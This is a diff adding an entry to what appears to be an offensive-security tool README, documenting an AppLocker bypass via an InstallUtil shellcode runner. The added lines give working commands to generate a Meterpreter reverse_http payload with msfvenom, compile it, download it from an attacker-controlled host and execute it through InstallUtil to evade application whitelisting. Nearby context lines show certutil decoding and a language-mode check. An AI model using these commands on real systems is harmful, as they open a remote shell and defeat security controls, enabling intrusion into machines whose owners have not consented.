@@ -62,6 +62,13 @@ certutil -decode clm_enc.txt clm.exe
 # Example of b64 below checks if the PowerShell run in FullLanguage
 clm.exe "JABFAHgAZQBjAHUAdABpAG8AbgBDAG8AbgB0AGUAeAB0AC4AUwBlAHMAcwBpAG8AbgBTAHQAYQB0AGUALgBMAGEAbgBnAHUAYQBnAGUATQBvAGQAZQA="
 ```
+* install_shellcode.cs - [APPLOCKER BYPASS](https://github.com/Karmaz95/install_shellcode.cs) => InstallUtil Shellcode Runner
+```
+msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=443 -f csharp -o shell.cs
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:install_shellcode.exe .\install_shellcode.cs
+iwr -uri 'http://$ip/install_shellcode.exe' -outfile C:/asd/install_shellcode.exe;
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U install_shellcode.exe
+```
 
 ## SCORE 
 <p align="center">
